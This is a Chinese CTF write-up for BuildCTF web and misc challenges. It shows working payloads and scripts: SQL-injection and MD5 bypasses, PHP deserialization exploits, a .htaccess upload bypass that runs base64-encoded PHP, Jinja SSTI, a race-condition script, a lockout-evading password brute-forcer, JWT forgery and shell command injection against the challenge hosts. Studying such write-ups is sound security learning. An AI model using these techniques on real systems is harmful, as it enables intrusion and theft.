# BuildCTF wp

## web

### ez!http|解题人：yatq

- 进入环境之后有按钮“进入后台”，尝试点击之后回显：**只有root用户才能访问后台 你是root嘛？** 
  
- 老套路尝试查看源码：

  

  ![屏幕截图 2024-10-25 220034](屏幕截图 2024-10-25 220034.png)

根据提示需要POST传参user=root，打开hackbar传参后又有回显： **只有从blog.buildctf.vip来的用户才可以访问**，修改请求头数据Referer。

又有回显（以下略）：**需要使用buildctf专用浏览器 **，改User-Agent。
**只有来自内网的用户才能访问 **，应该是XFF伪造IP,修改X-Forwarded-For为127.0.0.1（ 本地回环地址 ）

**只接受2042.99.99这一天发送的请求 **，修改Date请求头为：2042.99.99

**只有发起请求的邮箱为root@buildctf.vip才能访问后台 **，改From:  root@buildctf.vip 

**只接受代理为buildctf.via的请求 **, 改 Via: buildctf.via 

**浏览器只接受名为buildctf的语言**, Accept-Language: buildctf

得到一个获取flag按钮，点击之后发现回到了初始？
没关系，那就抓包看看吧，再次提交修改之后的http包，在点击按钮的时候抓包即得到flag



![2.png](C:\Users\Lenovo\Desktop\BuildCTF\BuildCTFwp\屏幕截图 2024-10-25 222506.png)

### find-the-id|解题人：yatq

#### hint:

善用工具，跟你爆了

是1到300之间的某个整数，非常抱歉引导性没做好给各位师傅带来了不好的体验

#### 过程：

- 根据提示输入数字，发现url发生变化?g=1，g的参数一直在变化。

  ![3.jpg](\屏幕截图 2024-10-25 222847.png)

- 结合提示，我们用bp抓包放在intruder进行爆破并设置g的参数在1-300。

- 爆破成功：
  ![4.jpg](屏幕截图 2024-10-25 223459.png)



### ez_md5|解题人：yatq

![5.jpg](屏幕截图 2024-10-25 223741.png)

 $sql = "SELECT flag FROM flags WHERE password = '".md5($password,true)."'"; 

有一个SQL语句，但是用md5值拼接？查文章发现：
这里贴一下，记住就行：**ffifdyop——绕过中一个奇妙的字符串**

ffifdyop经过[md5](https://so.csdn.net/so/search?q=md5&spm=1001.2101.3001.7020)加密后为：276f722736c95d99e921722cf9ed621c 

再转换为字符串：'or’6<乱码> 即 'or’66�]��!r,��b

用途：

select * from admin where password=''or'6<乱码>'
1
就相当于select * from admin where password=''or 1 可以实现sql注入

进入之后：

```php
 <?php
error_reporting(0);
///robots
highlight_file(__FILE__);
include("flag.php");
$Build=$_GET['a'];
$CTF=$_GET['b'];
if($_REQUEST) { 
  foreach($_REQUEST as $value) { 
    if(preg_match('/[a-zA-Z]/i', $value)) 
      die('不可以哦！'); 
  } 
}
if($Build != $CTF && md5($Build) == md5($CTF))
{
  if(md5($_POST['Build_CTF.com']) == "3e41f780146b6c246cd49dd296a3da28")
  {
    echo $flag;
  }else die("再想想");

}else die("不是吧这么简单的md5都过不去？");
?> 
    不是吧这么简单的md5都过不去？
```



看起来似乎是弱比较？ 有个注释///robots，想到了robots.txt,果然有，

/robots.txt中的hint:

```
level2
md5(114514xxxxxxx)
```

这是什么？xxxxxx??????（我刚开始没懂怎么用）

不管了先看看代码：需要GET传参a&b,然后。。。$Build != $CTF && md5($Build) == md5($CTF)
存在吗？
我能想到需要两个0e开头，但是由于前面的if(preg_match('/[a-zA-Z]/i', $value)) ，过滤了所有字母，而且由于我之前见到的都是有字母的，所以想不来。难道有纯数字的两个字符串而且0e开头？但最后又仔细查了一下：

![微信图片_20241020020511](微信图片_20241020020511.png)

是有的！
于是再看第二个if:if(md5($_POST['Build_CTF.com']) == "3e41f780146b6c246cd49dd296a3da28")

刚开始以为很简单，找个在线工具反解一下不就好了？

（这里面有一个小插曲：
我在找反解网站时，找了很多都解不出来，只有一个可以，但是要开100块的会员。。。）

而且随便传参居然没有相关回显？？？后来求助了学长学姐并且找到了一篇文章中是这样说的php之前的版本是会：

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/5106f10ea10266570cf9bc16a1c7e239.png)

 当`PHP版本小于8`时，如果参数中出现中括号`[`，中括号会被转换成下划线`_`，但是会出现转换错误导致接下来如果该参数名中还有`非法字符`并不会继续转换成下划线`_`，也就是说如果中括号`[`出现在前面，那么中括号`[`还是会被转换成下划线`_`，但是因为出错导致接下来的非法字符并不会被转换成下划线`_` 

所以只要写成Build[CTF.com就可以了，但是参数还是不知道怎么办呢?这时我想到了前面的提示，level2
md5(114514xxxxxxx)不会要遍历爆破吧？

于是找AI写了个脚本（以后得赶紧有自己写的能力啊！！！！！）

```python
import hashlib

# 目标MD5哈希值
target_md5 = "3e41f780146b6c246cd49dd296a3da28"

# 前缀
prefix = "114514"

# 遍历后面七位数字
for i in range(10000000):  # 0000000 到 9999999
    # 生成当前字符串
    current_string = prefix + str(i).zfill(7)

    # 计算MD5哈希值
    current_md5 = hashlib.md5(current_string.encode()).hexdigest()

    # 检查是否匹配目标MD5哈希值
    if current_md5 == target_md5:
        print(f"Found matching string: {current_string}")
        break
else:
    print("No matching string found.")
```

结果如下：
Found matching string: 1145146803531

最终传参，得到flag.

### babyupload|解题人：yatq

打开发现没啥东西，看源码也没啥，扫扫后台看看

![](屏幕截图 2024-10-25 235833.png)

进去看看，如题目所说是个文件上传：
![](屏幕截图 2024-10-26 000221.png)

发现能抓到包，排除前端js检测,不过刚开始怎么传都传不上去，含有恶意代码明文的也不行，但是普通文件可以传上去。能不能让普通文件代码执行？我想到了传图片马，但是没有文件包含呀？查找资料发现可以上传.htaccess来让任意含有php代码的文件执行php代码，开始行动：

![1728721771361](屏幕截图 2024-10-12 162928.png)

Content-Disposition: form-data; name="    upload_file"; filename=".htaccess"
Content-Type: image/jpeg

<FilesMatch "1.jpg">
SetHandler application/x-httpd-php
php_value auto_prepend_file "php://filter/convert.base64-decode/resource=1.jpg"
</FilesMatch>

把恶意代码base64加密，然后在.htaccess文件中写入php_value auto_prepend_file "php://filter/convert.base64-decode/resource=1.jpg"使得该文件名的文件被base64解密之后在当作php代码执行，这样就成功绕过了。（我还加了GIF89a的文件头，不知道需不需要）

1.jpg
GIF89a12
PD9waHAgcGhwaW5mbygpID8+

上传之后连接Antsword即可得到flag.或者在phpinfo中也可

### ez_waf|解题人：yatq

打开之后怎么传也传不进去。查找防火墙相关题目，并且尝试了使用脏数据混淆成功上传（蒙到了）

但是发现文件没有回显文件的URL地址。？？？根据文件上传给源码的做题经验，猜测在根目录的uploads相关目录里面，测试之后成功查看到，于是正常操作，你懂的。（蚁眼定真）

最终得到flag.

### eazyl0gin|解题人：yatq

给了源码：

```javascript
var express = require('express');
var router = express.Router();
const crypto = require('crypto');
const { type } = require('os');

/* GET users listing. */
router.get('/', function(req, res, next) {
  res.send('respond with a resource');
});

router.post('/login',function(req,res,next){
  var data = {
    username: String(req.body.username),
    password: String(req.body.password)
  }
  const md5 = crypto.createHash('md5');
  const flag = process.env.flag

  if(data.username.toLowerCase()==='buildctf'){
    return res.render('login',{data:"你不许用buildctf账户登陆"})
  }

  if(data.username.toUpperCase()!='BUILDCTF'){
    return res.render('login',{data:"只有buildctf这一个账户哦~"})
  }
  
  var md5pwd = md5.update(data.password).digest('hex')
  if(md5pwd.toLowerCase()!='b26230fafbc4b147ac48217291727c98'){
    return res.render('login',{data:"密码错误"})
  }
  return res.render('login',{data:flag})

})
module.exports = router;

```

密码找md5在线反解网站即可得知为012346。但是，捏麻麻地，存在这样的用户名？？？？有队友尝试遍历了所有的大小写组合，但是都以失败告终。存在这样的用户名？

**存在的。**

查资料发现JavaScript存在以下特性：
![1729874269245](1729874269245.png)

于是替换相应字符即可登陆成功得到flag.(这里贴一下大佬的文章)

https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html

### Why_so_serials?|解题人：yatq

```php
<?php

error_reporting(0);

highlight_file(__FILE__);

include('flag.php');

class Gotham{
    public $Bruce;
    public $Wayne;
    public $crime=false;
    public function __construct($Bruce,$Wayne){
        $this->Bruce = $Bruce;
        $this->Wayne = $Wayne;
    }
}

if(isset($_GET['Bruce']) && isset($_GET['Wayne'])){
    $Bruce = $_GET['Bruce'];
    $Wayne = $_GET['Wayne'];

    $city = new Gotham($Bruce,$Wayne);
    if(preg_match("/joker/", $Wayne)){
        $serial_city = str_replace('joker', 'batman', serialize($city));
        $boom = unserialize($serial_city);
        if($boom->crime){
            echo $flag;
        }
    }else{
    echo "no crime";
    }
}else{
    echo "HAHAHAHA batman can't catch me!";
}
?>
    HAHAHAHA batman can't catch me!
```

一看是反序列化题目，尝试构造pop链条？

不对，好像没很多魔术方法。到底在考什么呢？怎么让public $crime=true;呢？不懂

终于，在信息搜索时和与队友交流下发现，替换字符改变长短是字符串逃逸题目的特征。

str_replace('joker', 'batman', serialize($city));使得字符串变长，但是前面的长度数字却不变这就使得每次替换都会有一个字母没被识别进去，根据这些构造exp如下来间接修改$crime：

```php
<?php
class Gotham{
    public $Bruce;
    public $Wayne='jokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjoker";s:5:"crime";b:1;}';
    public $crime=true;

}
$batman=new Gotham;
echo urldecode(serialize($batman));
?>

```

传入Wayne参数中即可![1729815388040](1729815388040.png)

### LovePopChain|解题人：yatq

源码：

```php
<?php
class MyObject{
    public $NoLove="Do_You_Want_Fl4g?";
    public $Forgzy;
    public function __wakeup()
    {
        if($this->NoLove == "Do_You_Want_Fl4g?"){
            echo 'Love but not getting it!!';
        }
    }
    public function __invoke()
    {
        $this->Forgzy = clone new GaoZhouYue();
    }
}

class GaoZhouYue{
    public $Yuer;
    public $LastOne;
    public function __clone()
    {
        echo '最后一次了, 爱而不得, 未必就是遗憾~~';
        eval($_POST['y3y4']);
    }
}

class hybcx{
    public $JiuYue;
    public $Si;

    public function __call($fun1,$arg){
        $this->Si->JiuYue=$arg[0];
    }

    public function __toString(){
        $ai = $this->Si;
        echo 'I W1ll remember you';
        return $ai();
    }
}



if(isset($_GET['No_Need.For.Love'])){
    @unserialize($_GET['No_Need.For.Love']);
}else{
    highlight_file(__FILE__);
}
?>
```

典中典pop链，构造exp:

```php
<?php
class MyObject{
  public $NoLove="Do_You_Want_Fl4g?";
  public $Forgzy;

}

class GaoZhouYue{

  public $Yuer;
  public $LastOne;

}

class hybcx{
  public $JiuYue;
  public $Si;

}

$MyObject=new MyObject;

$GaoZhouYue=new GaoZhouYue;

$hybcx=new hybcx;

$MyObject->NoLove=$hybcx;

$hybcx->Si=$MyObject;

echo urlencode(serialize($MyObject));
?>
```

要注意的点和ez_md5中的一样，[绕过即可成功。9说起来容易，当天怀疑自己是不是不会写了……^_^）

### RedFlag|解题人：yatq

打开是flask应用相关源码：

```python

import flask
import os


app = flask.Flask(__name__)
app.config['FLAG'] = os.getenv('FLAG')

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/redflag/<path:redflag>')
def redflag(redflag):
    def safe_jinja(payload):
        payload = payload.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist])+payload
    return flask.render_template_string(safe_jinja(redflag))

```

看到{{% set {}=None%}}想到SSTI模板注入。
构造playload:
/redflag/%7B%7B1+2%7D%7D发现回显为3，证明确实有。

发现过滤了(),config所以很多东西都用不了，比如\__globals__['os'].popen('ls').read()  {{config}}之类的。

查询到一种没有()的方式：{{url_for.\__globals__['current_app'].config}}即可查看配置中的FLAG变量得到flag.



### fake_signin|解题人：yatq

```python
import time
from flask import Flask, render_template, redirect, url_for, session, request
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'BuildCTF'

CURRENT_DATE = datetime(2024, 9, 30)

users = {
    'admin': {
        'password': 'admin',
        'signins': {},
        'supplement_count': 0,  
    }
}


@app.route('/')
def index():
    if 'user' in session:
        return redirect(url_for('view_signin'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username in users and users[username]['password'] == password:
            session['user'] = username
            return redirect(url_for('view_signin'))
    return render_template('login.html')

@app.route('/view_signin')
def view_signin():
    if 'user' not in session:
        return redirect(url_for('login'))

    user = users[session['user']]
    signins = user['signins']

    dates = [(CURRENT_DATE.replace(day=i).strftime("%Y-%m-%d"), signins.get(CURRENT_DATE.replace(day=i).strftime("%Y-%m-%d"), False))
             for i in range(1, 31)]

    today = CURRENT_DATE.strftime("%Y-%m-%d")
    today_signed_in = today in signins

    if len([d for d in signins.values() if d]) >= 30:
        return render_template('view_signin.html', dates=dates, today_signed_in=today_signed_in, flag="FLAG{test_flag}")
    return render_template('view_signin.html', dates=dates, today_signed_in=today_signed_in)

@app.route('/signin')
def signin():
    if 'user' not in session:
        return redirect(url_for('login'))

    user = users[session['user']]
    today = CURRENT_DATE.strftime("%Y-%m-%d")

    if today not in user['signins']:
        user['signins'][today] = True
    return redirect(url_for('view_signin'))

@app.route('/supplement_signin', methods=['GET', 'POST'])
def supplement_signin():
    if 'user' not in session:
        return redirect(url_for('login'))

    user = users[session['user']]
    supplement_message = ""

    if request.method == 'POST':
        supplement_date = request.form.get('supplement_date')
        if supplement_date:
            if user['supplement_count'] < 1:  
                user['signins'][supplement_date] = True
                user['supplement_count'] += 1
            else:
                supplement_message = "本月补签次数已用完。"
        else:
            supplement_message = "请选择补签日期。"
        return redirect(url_for('view_signin'))

    supplement_dates = [(CURRENT_DATE.replace(day=i).strftime("%Y-%m-%d")) for i in range(1, 31)]
    return render_template('supplement_signin.html', supplement_dates=supplement_dates, message=supplement_message)

@app.route('/logout')
def logout():
    session.pop('user', None)   
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5051)
```

一共有两个功能签到和补签，由于today没有什么方法能改变了，所以重点关注补签路由。发现补签中先接受了补签日期，然后比较此时的补签次数是否大于一，想到了条件竞争，exp如下：

```python
import requests
import threading
s=requests.Session()
main_url="http://27.25.151.80:41433/"

def sign(username,password):
    data={"username":username,"password":password}
    r=s.post(main_url+"/login",data=data)
    print(r.text)
def supplement_signin(supplement_date):
    data={"supplement_date":supplement_date}
    r=s.post(main_url+"/supplement_signin",data=data)
    print(supplement_date)
    print(r.status_code)
    print(r.text)
supplement_dates = [f'2024-09-{i:02d}' for i in range(1, 30)]
sign("admin","admin")
#线程池
threads=[]
#遍历补签日期
for supplement_date in supplement_dates:
    t=threading.Thread(target=supplement_signin, args=(supplement_date,))
    t.start()
    threads.append(t)
for t in threads:
    t.join()
```

### sub|解题人：yatq

进入环境发现有多个文件可以读取，但是显示不能访问，应该是权限不够。

发现有注册和登录功能。

尝试注册一个随机账户，然后想办法提权

题目源码中发现有jwt相关的import,在注册时抓包发现也有jwt出现

找了找网上好像有在线解析的网站，解析之后发现可以更改，但是需要密钥，而恰好源码中提供了密钥为：BuildCTF
根据源码更改为admin之后尝试访问前面发现的文件：发现是空的。。。

没关系，既然已经可以查看文件了，而且根据源码看出，此时在执行系统命令，猜测可以进行命令拼接。
尝试在file之后写入||env
得到flag

### tflock|解题人：yatq

进去之后是一个登录框

没什么信息尝试扫描后台
![142a3fe888e7d7d0894f56696ce04f1](D:\WeChat Files\wxid_f30o1ybzarmf22\FileStorage\Temp\142a3fe888e7d7d0894f56696ce04f1.png)

好家伙，全是信息
robots.txt:

```
User-agent: *
Disallow: /passwordList
```

访问/passwordList

#### Index of /passwordList

| ![[ICO]](http://27.25.151.80:44127/icons/blank.gif)      | [Name](http://27.25.151.80:44127/passwordList/?C=N;O=D)      | [Last modified](http://27.25.151.80:44127/passwordList/?C=M;O=A) | [Size](http://27.25.151.80:44127/passwordList/?C=S;O=A) | [Description](http://27.25.151.80:44127/passwordList/?C=D;O=A) |
| -------------------------------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------- | ------------------------------------------------------------ |
|                                                          |                                                              |                                                              |                                                         |                                                              |
| ![[PARENTDIR]](http://27.25.151.80:44127/icons/back.gif) | [Parent Directory](http://27.25.151.80:44127/)               |                                                              | -                                                       |                                                              |
| ![[TXT]](http://27.25.151.80:44127/icons/text.gif)       | [ctferpass.txt](http://27.25.151.80:44127/passwordList/ctferpass.txt) | 2024-09-27 02:54                                             | 20                                                      |                                                              |
| ![[TXT]](http://27.25.151.80:44127/icons/text.gif)       | [password.txt](http://27.25.151.80:44127/passwordList/password.txt) | 2024-09-26 14:50                                             | 5.4K                                                    |                                                              |
|                                                          |                                                              |                                                              |                                                         |                                                              |

Apache/2.4.56 (Debian) Server at 27.25.151.80 Port 44127

发现两个文件：

ctferpass.txt：

```
ctfer:123456
admin:x
```

另一个类似密码薄：

```
TsS3p1PzsA
r1g6O5&Ex6
6E7mKxQNtV
beLS5zj0M-
9Wa$mGiWiF
Nxn_&7UfuG
*Zw!1-7y2x
+xTPhG&T&E
gKuO5#0b-^
iEq1+@rVm^
MLYxrzIf&t
iTL_dVHWQ_
q@61-k$kEA
sjbELVQzq*
FTxGHUCSVs
EczP9odFFF
8BHA@@N_45
kHWdN@G7CL
u+u$oz#LZw
4q$wH^K*Co
8$HCYfizSY
1guz_e6#qV
U*1-j7y-e5
dmmGPuu1Zl
5hyHCIm$yM
nh4eBPmg2b
cZ$_6!YHs%
&63WG8^zWk
HP^FBbx%OK
kSJlTq%xxO
mYmcyMaO9i
iPtotu8qr#
iG3b+Bq!Gj
YLVFeU^%xA
3%gHGh&bai
OZ94qU7W01
XkGbIIG5F-
_4jr3-Czs9
vptcY&HQdz
*Nd60&R*Hg
GQX9Y7nE4K
ZZsBhsBh4H
2jFFCf1Y7@
#eAGHJ&Cow
&W6WD$DYKP
rl4-JMLXZr
_377O&rLMR
T0bG8A#a8E
mdDNmDZ-66
yTlVr4=kkE
mn8s=Ae_aW
0l#YdAWFg^
E+r7N&qmh%
Re#TPkKzVV
St%_%pIzUA
b1_Mcb9E#u
-E$5Q34Uj9
!!$6NQL%ld
2Z3!#lPRbC
QIE_A0#p5d
KFV2NmmC5_
S!F3X+a_X^
d_m99C$xLq
Y1S9s!-#HU
^K3Q#WGdj5
##iYgPnd+6
Xa2S3UOmXn
vkrHz3!NQe
*xepta-^8C
@-w4TtLYkr
PBhx-EL^Ef
yJtX@0lPRj
@J47=P#6!i
^SvC1JrVo%
-2bXj=hLiW
S2g1rkIxpT
M_P+Lc3v&5
HaayN!6i8v
AMrFYMa2l+
!kDSGMW51m
GBmhu3k%Lt
1+1HFaB!8W
OTMh^Y+cbP
#qAcs0kvv1
vuOxd+!T^6
+Z=nfyJptQ
Ybi!HOf#M&
NeDyZI+ewp
ZDnz17^dHd
rqS2wDp+ku
Ly@72$Qxzv
Pi&T@MkJxx
J=F##qgdWS
Z%2LrLIHk-
aw@UUyvAqz
5OBei$bXOb
0YbxUosYD7
OtZ2GlQIh3
%QUGy749i^
2gXTM$6XhY
whV!SQkt_O
mw*q_hKy6u
ucm=MEC1$a
CY8WzfjyTN
rqTpY1YQ8W
dl4yseE-kc
HE!jec$j3e
CP_IoxM=Pg
1jvSdMtNP0
Xk-KpABJ&n
_LcR_=#+d!
StpW6BPg@s
BRD0rZi1Fh
TZxhRcM5%g
occD6-cBHg
+!d@Yg2gpp
Pmx$feFF%%
Qtzus_xLR-
A=uA!H7tO-
Tu-rrHQ+62
N%W^oaLizI
@pH*sVi#pK
3Tx1#d*x%R
D7NjbpAcuo
jxgsi7hN+G
F9qJRSIMf6
lM7osQyZ96
rl%I-Feusn
B7eTOef9ro
rZ1$2GZxhr
vTAoiBgwe6
aEiA@XG3Mb
YXoFU6eXP8
3uZ$Ofe*Z%
M*$D$%%r2z
++$kk5*l_d
EiEwN_ab=C
d#0JJckL+k
sj@EwKj+LA
YB^Y8wy$0&
Q65UYbq0dQ
jY5OEXz$^Q
WpekxM8y#q
k1%jdYe%84
imCO8kwRR@
WEm96o_Wpd
lp7SER3G_t
R4FZ5Ta%=$
3dNMejAsXf
jl5hrRZOb+
nJCM!fDOpR
@csk_3DR@J
M0DJ2JvoFi
&1f_Fh93m7
HAC^W0mB_k
A1sjD!O8Po
%tI%M+WVUU
w7AD3xix-a
^MT9aUcz@a
c@&fojw-zU
nrCjAvLTfC
n%xBLtQB5U
Bc8SYRp_FB
JuonXfF%=-
$wMH*hvX4N
dmT^DCU%3u
TzOCLGZ1yc
Q@@+jCNDkN
9s$ALnZtkz
sW8BPm!Frm
@p2F1BXuzi
p4prK43@tq
mHRARDT$UP
3MCF4LQyYY
J6w7H!Z_9s
Cahm1XQ#Cb
DC#m76QeNG
kUT_LNB#9S
5-kNdpT@6N
$a&fxc6_VC
H&h5&=%MW6
POUY_i6BoD
B=^C4hfuS#
NfaP-7ZHg9
_IXYfW=y3b
X77EtXID&*
QEUXGomQCI
G4w03s-xHL
W_uD_7%ySa
nfDa#_HBlS
WATv!1PM89
bMMLaAPCz9
6Qtbg$m3hl
0#gI4w5@4M
26H0P_tLGD
^^uQDpoqle
M%*JAgW0Xb
OnH86!-v9D
BLPFt6#2PC
#_U&YjqnWV
=^=CpA+e41
!FObHhA5%-
u+jisfoX%A
_12A6!cxen
YFG6$LWZJD
TtygvwanUP
amAO-lMs5B
+XZZVmkHCB
=Tu@2AmvA!
KtjW$Bd!h3
_h6C^tcyl*
EWkARmX1Y1
zZ737c%i8d
F8jFGSwy9c
%PJlOMk7e&
hb1MPIbG-W
g^MzLK6qvn
kpD75wBisJ
L1WtZjr76K
-^fu8#beX8
KG5af+CRZV
nixqbKH6gI
C-I0D@iB&g
=qaVtdG!DZ
*tt+XY74Mk
YyMqbso-dT
7n@M32-x5D
mMOy!asOi6
B0eeXRd_Ln
40Jx^Jyw5p
NpsEskLBcx
6%#*h2SbuU
^!6D*ga3bU
QsbjdBW4-z
eyZPig=^4h
HqyPDE58P^
DADThqRabc
Sq8%k5^ell
2=pg3C_O%K
Xvt-ie11Cg
+Rg1qkHc%Y
4NYfHq%Knv
B$X1ySyjL%
%y*wQ=I&qt
Cny47+n%QT
_=C5kGJRqq
XreR4GJJZ5
=Vd#lzuuRT
6Twt5H#Z&V
Cz3hq%FwLE
^lN_cQv@tO
JNqx6_oV!w
m7Fj@mu211
pWdCgI9LJ4
+SvOhS#lbA
2^=k_Pg^Ba
B9zq7*WAdx
Qtq=RKoAHP
-S+PrnfO%4
P5FQ^XD7T7
u1Y8*NXJ@z
%aOT=Wg1^l
bL&zDYv&c0
zxSZMEDEG4
ZeS0KD=BIy
*P&11ryhs4
ufkECB^29t
+tDzT1I+Vd
YlkF+dZBOB
vUd5+E_UD2
KS3!XTZjgi
-M3$M+5Mo%
t4w5eCIj31
AIfS&k&Whs
bsnelva4Qg
yyvceN*lpU
2EauO8S^l-
9&E!9%fmrk
=A8OZyK10o
UBrQmSX@LL
et=XYFaDBk
AE&gg7!vjY
&Bd9DQzTSj
cFvS=DU0-0
6G5i3ov+rr
PA_$jS2+65
*l^d^z!6NP
+eKLqhfwSi
C$+YD_gjsZ
uEDg6W!c4g
hUPV=E#%EF
g9kXJpQMWR
@I-aS4cENb
@M3O22YRm6
o5p&$#84AR
HUxG4LfYmA
-ov^f$+Ky#
NM8tbtH0I@
uP*2sbMxNj
jMVLxVyCk!
eP$D@xUhob
cZQ1J=vQ4p
5M-_avsuhW
!&gnE0zff0
@ki2&b*8v4
$9f#mtFEPd
P9e4GobihS
uI^kTZwqw9
fbLBivld+$
=ki&6+JXZ2
Fz*kODclH#
Evdmc!ZLqC
jRPMk6Wm&E
l@pkRBGB&h
1C_0_+OeG9
&GOuBFpROl
MKhWYnf$qS
#4Z5yQx&V-
8&OYb8lyUk
XVcEiioGe-
PJr@vzH@qz
DZ4f$reQgH
%LtmqaXjJr
PrxZ&QhDn8
%&D^J_Db03
1Cvx#C+HH-
lM636qj-PJ
=nEqXCJ71D
rprZX*y@0k
&HM1U&9#G0
$fs&^2ccKr
bTU=@H9it6
FQBxmPcgsi
P0tG@8Nas0
-hYKlO@XIN
*Vq0Dgs!mz
ti1oLz@OhU
n=dvT@Y$*v
S$MYPSPTaX
Gu1=@Fdyh9
6urg!FzPZc
few$z7L1Ie
%h@QxfIYrm
5=p@y!e=hV
vS!qB%AkeV
zi13PGaPYk
L-bNBozi2q
nb$3GwIz9+
Hp2+ei@Q@n
-5N09qUZFd
CFwTOccz_b
wPe3=HayRp
L%WMbQO_l#
-hUpZ1yhMR
QH^IhnpMVn
HwmdXd%NF%
76cMlYpMkA
7TkS*8n^pG
Su6lHBoDHv
w#s5Of%Mw=
mB^vGb3BAd
^v6uOsN#j@
O9!8T_Q9oR
HUA#N#6I2g
Fpg*zprPbz
i8@mFyKW$V
5rNyc^G+qu
W9s=e_*%#n
Dy=OL65zoZ
cOV-zb4LEx
E@9%kD^5D7
y41TH&vcyv
jk6P$RAAXI
7wW8%O%GA_
G7jpZpj-nE
WW3IY#aWOq
tg=YKf_9TC
rGRw&_n&v*
HdDdy%SKUX
x^Mj%CY8BF
f48k7%RSI6
^Faf5Dn7HI
%UHL0cqg@y
n7XC85^-XD
6znQS_B!0&
t4bonQjMOg
B0n0^g64d@
#hpn4s#D0L
S0R&HM8kxU
%ZOYg0^Lng
PVrkMf-$Jq
yymdpn2ML0
3^r0-AmunU
$W2*9bp^@x
7bgee!Ufyu
sbi1i2^3k2
HLJcw=#1@n
_=GFxvC4&s
x#uyB@90p!
r_eaic*AiR
98la%AgnZs
#hTSnVsuiN
*ALSSrCrMt
jS-8qJ1Pnd
_=#KQIFpR5
aecLmrH9k0
OsnvtsFH5u
_z=bzzzH$z
lzMu+hG1xx
BH&e^27Ie=
$BT!USfcQG
+fx=T0ol*M
PKM%w@fHdW
vdb@blDnKr
fB6_fYAY=n
eUmzfvy=n-
o&x%sDB4_u
#3#xl5uwY3
iHaNoNICes
vVmxTB!D3&
K%K3W%HmHD
zdB8RxMcbL
vz^J#^!Wa0
-s+1hps&l+
krLRLMAxxH
#3dhVRyrDu
6iIPtzrL%4
7UjJ+YnZ3x
5-lvVxPNYM
5YLoG!cXgW
ZsMP5KW2Q0
ErUxt!zhrJ
E4!fGaPcgx
Acza@r9C$R
3QqNfpfFEC
jkr$2heJN-
5ek^20ibJ8
U*PG$Dcjoa
LslQ-#i=9b
-kS#!Nlmmd
pQy_8k%Dm-
MN1WKEyp!H
pLLg2tJuPA
fV_zTmhPE=
1qtTahzf-c
4P31Z-ip3^
s8FsJZ+5OU
@aYa3a5c@R
CVb_p_6j+3
hvc7WtL3I5
tUxQNrv#+I
+8WWRG@IM#
TIY9%*_Tgl
jN34M+ndJV
q_UxPWVIg5
Z@s-a@^Mu_
77d5BuR$BP
1MOjrfSHBw
yVQ7fbf0Yk
s%x*fU*HDT
GW8icgIZuy
2juhDTIABU
wNMAJqHiaY
+Ne&4fUKd^
iIO48pGbOa
NcB&OXxhB_
Gkygz&^q80
yD5fo8ompA
KmkgwUPapp
JfAA56@k-6
BktbojrA@q
0b2wPpRC_5
M8L^SDMphE
j86qEsD=0C
e51bMI=ZXu
AehA7S36dY
@lDs^yOuZU
!aFPazNv9g
^dP^8&JIH-
zQIio9#r#3
BKLPdIosC=
R=lPVuhq5Q
reADerZhml
ZR=L#IEGj5
4lU_b7JoKu
tdFX=uarQZ
Bu^^sWnGfO
^8-0aKVBag
ursKT#hFTb
ZXqiG3*DVb
9e9mopXETI
cRS$-ud!xF
h^dDyAc%bg
Aq7Fuyw-KW
!TEie&ac^s
HUw$Gg0@WS
Yc0^po=TNG
mf3rG-oKSC
+0vQlr1zsq
suNp@*S_S7
```

第一个应该是用户名和密码，admin显示不知道，猜测和密码簿有关；

登录CTfer账户看看
回显如下：hello ctfer

#### 你想要的东西在admin的用户页面里，想办法去拿到吧，加油 ctfer

好，尝试遍历密码簿中的密码进行登录，但是发现每三次会锁定不让登陆了，但是经过和队友提供的天才灵感，发现只要在第三次登录一下Ctfer的账号，就又可以试错了（天才！！！）把密码簿复制到本地，exp如下：

```python
import requests
main_url="http://27.25.151.80:40863"
def login(username,password):
    url=main_url+"/login.php"
    data={
        "username":username,
        "password":password,
    }
    r = s.post(url, data)
    return r.text
s=requests.session()
with open("C:\\Users\\Lenovo\Desktop\\adminpasswd.txt","r") as f:
    passwords=[password.strip() for password in f.readlines()]
for i in range(len(passwords)):

    if (i+1)%3==0:
        r=login("ctfer","123456")
    else:
        password = passwords[i]
        r = login("admin", password)
        if "true" in r:
            print("true_password:"+password)
            break



```

最终得到正确密码后登录拿到flag.

### 刮刮乐|解题人：yatq

进入之后看了一下源码，发现提示cmd传参
于是传参?cmd=ls
回显提示改Referer为baidu.com

改了之后发现居然没回显了？
尝试一番之后发现ls闭合'';之后就可以有回显了，于是cat /flag; 得到flag.

## misc

### HEX的秘密|解题人：yatq

c2f5e9ece4c3d4c6fbb3c5fafadfc1b5e3a1a1dfe2e9eee1f2f9f9f9fd

打开是一串16进制编码，解码后确实乱码。为啥？

![1729890276137](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729890276137.png)我搜索相关资料之后可以知道： 每个16进制都是大于 `7F` 的，换算成10进制就是都大于 `127` 的，于是我们让每个16进制 **都减去128** 再用ASCII解密。 

```python
s = 'c2f5e9ece4c3d4c6fbb3c5fafadfc1b5e3a1a1dfe2e9eee1f2f9f9f9fd'
ls = [ chr(int(f"{s[i]}{s[i+1]}",16)-128) for i in range(0,len(s),2) ]
print(''.join(ls))
```

得到运行结果即为flag.

### what is this?|解题人：yatq

打开文件一堆二进制，尝试转ascii,得到如下：
ccc,ppppp,ccppcp,p,cccc,cpppp,ccc,ccppcp,cpppp,ccccc,ccppcp,pp,ppppp,cpc,ccccc,c,ccppcp,pcpc,ppppp,pcc,c,ccppcp,pcpcpp,pcpcpp

只有两个字母，想到morse电码，尝试转，将c认为. p认为是-
解出来再转码即可得到flag.

### EZ_ZIP|解题人：yatq



![1729906450100](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729906450100.png)

打开附件是一张二维码的图片。丢进binwalk看看
